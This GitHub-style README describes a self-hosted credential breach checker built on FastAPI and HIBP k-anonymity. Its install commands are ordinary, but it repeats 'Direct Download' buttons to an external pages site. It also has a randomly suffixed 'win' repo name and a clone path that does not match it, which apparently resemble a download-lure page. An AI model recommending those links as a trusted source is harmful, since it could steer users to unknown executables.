# CredentialGuard Pro - credential breach checker 2026

> A full-stack credential breach checker that uses k-anonymity architecture with SHA-1 hash prefixes to proxy against HIBP, featuring entropy analysis, crack-time estimation, and cryptographically secure password generation.

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/reedmathis36/credentialguard-win-38559?style=flat-square)](https://github.com/reedmathis36/credentialguard-win-38559)

---

<p align="center">
  <a href="https://reedmathis36.github.io/credentialguard-win-38559/">
    <img src="https://img.shields.io/badge/Download-CredentialGuard%20Pro%20Latest-brightgreen?style=for-the-badge" alt="Download CredentialGuard Pro">
  </a>
</p>

> **[Direct Download - CredentialGuard Pro v1.0.0](https://reedmathis36.github.io/credentialguard-win-38559/)**

---

[Download Latest Build](https://reedmathis36.github.io/credentialguard-win-38559/)

---

## About CredentialGuard Pro

CredentialGuard Pro is a privacy-respecting credential breach checker built with FastAPI and vanilla JavaScript. It allows individuals and security-conscious teams to verify whether their passwords, emails, or usernames have appeared in known data breaches without exposing the full credential to external services. By implementing k-anonymity through SHA-1 hash prefix matching, the tool ensures that only a partial hash is sent to the Have I Been Pwned API, keeping the original password or email completely private.

This application is designed for anyone who wants to take proactive control of their digital security posture. Whether you are an IT administrator auditing employee credentials or a personal user checking your own exposure, CredentialGuard Pro provides a self-hosted, Docker-deployable solution that runs entirely on your infrastructure. The combination of entropy analysis, crack-time estimation, and a built-in password generator makes it a comprehensive credential health dashboard rather than just a simple lookup tool.

---

## Features

- **Password Check with Entropy & Strength Scoring** – Evaluate password robustness using advanced entropy analysis and receive a clear strength rating.
- **Password Generator with Crack-Time Estimation** – Generate cryptographically secure passwords and see how long they would take to crack under different attack scenarios.
- **Email Breach Lookup** – Check if an email address appears in known data breaches using the same k-anonymity approach.
- **Username Multi-Source Lookup** – Search for compromised usernames across multiple breach sources.
- **Dark/Light Mode** – Toggle between visual themes for comfortable use in any environment.
- **Check History via LocalStorage** – Review past credential checks stored locally in your browser without server-side logging.
- **Health Dashboard** – Monitor system status, rate limit usage, and API connectivity at a glance.
- **Docker One-Command Deployment** – Launch the entire application with a single Docker command, including FastAPI backend and static frontend.
- **Sliding-Window Rate Limiting** – Protect against abuse with configurable per-IP rate limiting that resets over time.

---

## Installation

Clone the repository from GitHub:

```bash
git clone https://github.com/reedmathis36/credentialguard-win-38559.git
cd credentialguard-pro
```

For Docker deployment, run the following command:

```bash
docker-compose up --build
```

For manual installation, set up a Python virtual environment and install dependencies:

```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install -r requirements.txt
uvicorn app.main:app --reload
```

The application will be available at `http://localhost:8000`.

---

## Usage

1. **Password Check** – Navigate to the password check section, enter a password, and view its entropy score, strength rating, and breach status.
2. **Email Lookup** – Enter an email address to see if it appears in any known breaches. The tool uses k-anonymity so only a partial hash is sent externally.
3. **Username Search** – Provide a username to check across multiple breach databases.
4. **Password Generator** – Set your desired length and character preferences, then generate a secure password with estimated crack time.
5. **View History** – Access the history panel to review previously checked credentials stored in your browser's LocalStorage.
6. **Health Dashboard** – Visit the dashboard to see API status, rate limit counters, and system health metrics.

---

## Configuration

All configurable settings are stored in a `.env` file in the project root. Key configuration options include:

- `RATE_LIMIT_WINDOW` – Duration in seconds for the sliding window (default: 60)
- `RATE_LIMIT_MAX_REQUESTS` – Maximum requests allowed per window (default: 30)
- `SECRET_KEY` – Used for session management and CSRF protection
- `HIBP_API_KEY` – Optional API key for increased HIBP rate limits

The application also supports environment variables for Docker deployments. Settings can be modified without rebuilding the container by passing environment variables to `docker-compose.yml`.

---

## Requirements

- **Platform**: Python 3.9+
- **Runtime**: FastAPI, Uvicorn
- **Storage**: LocalStorage in browser (no server-side database required)
- **Docker**: Docker Engine 20.10+ with Docker Compose v2+ (for containerized deployment)
- **Browser**: Modern browser with JavaScript enabled (Chrome, Firefox, Edge, Safari)
- **Network**: Outbound HTTPS access to `api.pwnedpasswords.com` for breach lookups

---

## FAQ

**How does the k-anonymity architecture protect my credentials?**  
When checking a password, CredentialGuard Pro sends only the first five characters of its SHA-1 hash to the HIBP API. The API returns a list of hash suffixes that match the prefix, and the tool compares locally. This means your full password or hash never leaves your machine.

**Can I use this without Docker?**  
Yes. The application runs as a standard FastAPI service. You can install the Python dependencies manually and run it with Uvicorn as shown in the installation section.

**How often is the breach database updated?**  
CredentialGuard Pro relies on the HIBP API, which is updated regularly as new breaches are discovered and disclosed. The tool does not maintain its own breach database.

**Is there a way to clear my check history?**  
Your check history is stored in your browser's LocalStorage. You can clear it through your browser's developer tools or by selecting the clear history option in the application's settings panel.

**What should I do if I encounter rate limiting?**  
The sliding-window rate limiter is designed to prevent abuse. If you hit the limit, wait for the window to reset (default 60 seconds). For higher usage, configure the `RATE_LIMIT_MAX_REQUESTS` setting in your `.env` file.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
